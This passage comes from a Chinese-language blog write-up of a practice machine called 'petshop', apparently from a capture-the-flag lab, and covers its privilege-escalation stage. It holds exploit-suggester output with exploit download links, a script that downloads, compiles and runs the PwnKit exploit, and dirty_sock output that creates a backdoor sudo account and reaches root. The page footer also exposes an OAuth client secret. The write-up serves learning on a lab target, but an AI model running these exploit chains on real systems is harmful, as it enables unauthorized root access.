], debian=9|10<br>   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main<br><br>[+] [CVE-2018-18955] subuid_shell<br><br>   Details: https://bugs.chromium.org/p/project-zero/issues/detail?<span class="hljs-built_in">id</span>=1712<br>   Exposure: probable<br>   Tags: [ ubuntu=18.04 ]&#123;kernel:4.15.0-20-generic&#125;,fedora=28&#123;kernel:4.16.3-301.fc28&#125;<br>   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/45886.zip<br>   Comments: CONFIG_USER_NS needs to be enabled<br><br>[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)<br><br>   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/<br>https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/<br>   Exposure: less probable<br>   Tags: ubuntu=(22.04)&#123;kernel:5.15.0-27-generic&#125;<br>   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c<br>   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)<br><br>[+] [CVE-2022-2586] nft_object UAF<br><br>   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5<br>   Exposure: less probable<br>   Tags: ubuntu=(20.04)&#123;kernel:5.12.13&#125;<br>   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1<br>   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)<br><br>[+] [CVE-2021-22555] Netfilter heap out-of-bounds write<br><br>   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html<br>   Exposure: less probable<br>   Tags: ubuntu=20.04&#123;kernel:5.8.0-*&#125;<br>   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c<br>   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c<br>   Comments: ip_tables kernel module must be loaded<br><br>[+] [CVE-2019-7304] dirty_sock<br><br>   Details: https://initblog.com/2019/dirty-sock/<br>   Exposure: less probable<br>   Tags: ubuntu=18.10,mint=19<br>   Download URL: https://github.com/initstring/dirty_sock/archive/master.zip<br>   Comments: Distros use own versioning scheme. Manual verification needed.<br><br>[+] [CVE-2019-18634] sudo pwfeedback<br><br>   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/<br>   Exposure: less probable<br>   Tags: mint=19<br>   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c<br>   Comments: sudo configuration requires pwfeedback to be enabled.<br><br>[+] [CVE-2019-15666] XFRM_UAF<br><br>   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc<br>   Exposure: less probable<br>   Download URL: <br>   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled<br><br>[+] [CVE-2017-5618] setuid screen v4.5.0 LPE<br><br>   Details: https://seclists.org/oss-sec/2017/q1/184<br>   Exposure: less probable<br>   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154<br><br>[+] [CVE-2017-0358] ntfs-3g-modprobe<br><br>   Details: https://bugs.chromium.org/p/project-zero/issues/detail?<span class="hljs-built_in">id</span>=1072<br>   Exposure: less probable<br>   Tags: ubuntu=16.04&#123;ntfs-3g:2015.3.14AR.1-1build1&#125;,debian=7.0&#123;ntfs-3g:2012.1.15AR.5-2.1+deb7u2&#125;,debian=8.0&#123;ntfs-3g:2014.2.15AR.2-1+deb8u2&#125;<br>   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/41356.zip<br>   Comments: Distros use own versioning scheme. Manual verification needed. Linux headers must be installed. System must have at least two CPU cores.<br><br></code></pre></td></tr></table></figure>

<p>因为暂时没什么好办法试试内核提权把。</p>
<h3 id="pwnkit"><a href="#pwnkit" class="headerlink" title="pwnkit"></a>pwnkit</h3><p>直接从<a target="_blank" rel="noopener" href="https://codeload.github.com/berdav/CVE-2021-4034/zip/main%E4%B8%8B%E8%BD%BD%EF%BC%8C%E4%BB%8E%E9%87%8C%E9%9D%A2%E7%9A%84.sh%E6%96%87%E4%BB%B6%E6%8B%B7%E8%B4%9D%E5%86%85%E5%AE%B9%E7%9B%B4%E6%8E%A5%E5%9C%A8%E9%9D%B6%E6%9C%BA%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AAexp.sh%E3%80%82%E5%B0%9D%E8%AF%95%E6%89%A7%E8%A1%8C%E3%80%82">https://codeload.github.com/berdav/CVE-2021-4034/zip/main下载，从里面的.sh文件拷贝内容直接在靶机创建一个exp.sh。尝试执行。</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@petshop:/tmp$ <span class="hljs-built_in">cat</span> exp.sh<br><span class="hljs-built_in">cat</span> exp.sh<br><span class="hljs-comment">#!/usr/bin/env sh</span><br><br>URL=https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/<br><br><span class="hljs-keyword">for</span> EXPLOIT <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;URL&#125;</span>/cve-2021-4034.c&quot;</span> \<br>               <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;URL&#125;</span>/pwnkit.c&quot;</span> \<br>               <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;URL&#125;</span>/Makefile&quot;</span><br><span class="hljs-keyword">do</span><br>    curl -sLO <span class="hljs-string">&quot;<span class="hljs-variable">$EXPLOIT</span>&quot;</span> || wget --no-hsts -q <span class="hljs-string">&quot;<span class="hljs-variable">$EXPLOIT</span>&quot;</span> -O <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;EXPLOIT##*/&#125;</span>&quot;</span><br><span class="hljs-keyword">done</span><br><br>make<br><br>./cve-2021-4034<br>www-data@petshop:/tmp$ <span class="hljs-built_in">chmod</span> 777 exp.sh<br><span class="hljs-built_in">chmod</span> 777 exp.sh<br>www-data@petshop:/tmp$ ./exp.sh<br>./exp.sh<br>cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c<br>cc -Wall    cve-2021-4034.c   -o cve-2021-4034<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;module UTF-8// PWNKIT// pwnkit 1&quot;</span> &gt; gconv-modules<br><span class="hljs-built_in">mkdir</span> -p GCONV_PATH=.<br><span class="hljs-built_in">cp</span> -f /bin/true GCONV_PATH=./pwnkit.so:.<br><span class="hljs-comment"># whoami</span><br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),33(www-data)<br><br></code></pre></td></tr></table></figure>

<p>发现直接成功提权了</p>
<h3 id="dirtysock"><a href="#dirtysock" class="headerlink" title="dirtysock"></a>dirtysock</h3><p>除了pwnkit，dirtysock也可以实现提权。其实dirtysock的利用脚本有两个，但是version 1的版本需要用到自己生成的rsa公钥，懒得弄了，version2可以直接创建用户更方便，就直接用version2试试，不行再用回1。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@petshop:/tmp$ python3 ./4	<br>python3 ./46362 <br><br>      ___  _ ____ ___ _   _     ____ ____ ____ _  _ <br>      |  \ | |__/  |   \_/      [__  |  | |    |_/  <br>      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ <br>                       (version 2)<br><br>//=========[]==========================================\\<br>|| R&amp;D     || initstring (@init_string)                ||<br>|| Source  || https://github.com/initstring/dirty_sock ||<br>|| Details || https://initblog.com/2019/dirty-sock     ||<br>\\=========[]==========================================//<br><br><br>[+] Slipped dirty sock on random socket file: /tmp/daqnoauofi;uid=0;<br>[+] Binding to socket file...<br>[+] Connecting to snapd API...<br>[+] Deleting trojan snap (and sleeping 5 seconds)...<br>[+] Installing the trojan snap (and sleeping 8 seconds)...<br>[+] Deleting trojan snap (and sleeping 5 seconds)...<br><br><br><br>********************<br>Success! You can now `su` to the following account and use sudo:<br>   username: dirty_sock<br>   password: dirty_sock<br>********************<br><br><br><br>www-data@petshop:/tmp$ su dirty_sock<br>su dirty_sock<br>su: must be run from a terminal<br>www-data@petshop:/tmp$ python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>python3 -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@petshop:/tmp$ su dirty_sock<br>su dirty_sock<br>Password: dirty_sock<br><br>To run a <span class="hljs-built_in">command</span> as administrator (user <span class="hljs-string">&quot;root&quot;</span>), use <span class="hljs-string">&quot;sudo &lt;command&gt;&quot;</span>.<br>See <span class="hljs-string">&quot;man sudo_root&quot;</span> <span class="hljs-keyword">for</span> details.<br><br>dirty_sock@petshop:/tmp$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1001(dirty_sock) gid=1001(dirty_sock) <span class="hljs-built_in">groups</span>=1001(dirty_sock),27(sudo)<br>dirty_sock@petshop:/tmp$ sudo su<br>sudo su<br>[sudo] password <span class="hljs-keyword">for</span> dirty_sock: dirty_sock<br><br>root@petshop:/tmp<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@petshop:~<span class="hljs-comment"># ls -la</span><br><span class="hljs-built_in">ls</span> -la<br>total 24<br>drwx------  3 root root 4096 Jun  3 18:32 .<br>drwxr-xr-x 23 root root 4096 Apr  9  2021 ..<br>lrwxrwxrwx  1 root root    9 Apr 10  2021 .bash_history -&gt; /dev/null<br>-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc<br>-rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>-r--------  1 root root   38 Apr 30  2021 root.txt<br>drwx------  3 root root 4096 Jun  3 18:32 snap<br>root@petshop:~<span class="hljs-comment"># cat ro	</span><br><span class="hljs-built_in">cat</span> root.txt <br>THM&#123;get_it_urself&#125;<br>root@petshop:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>

<p>可以成功拿到root flag。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/03/DC-6/">[vulnhub]  DC:6 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp"><span class="toc-number">3.1.</span> <span class="toc-text">ftp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web"><span class="toc-number">3.2.</span> <span class="toc-text">web</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#monitorr%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">monitorr漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9exp"><span class="toc-number">3.4.</span> <span class="toc-text">修改exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pwnkit"><span class="toc-number">4.1.</span> <span class="toc-text">pwnkit</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dirtysock"><span class="toc-number">4.2.</span> <span class="toc-text">dirtysock</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>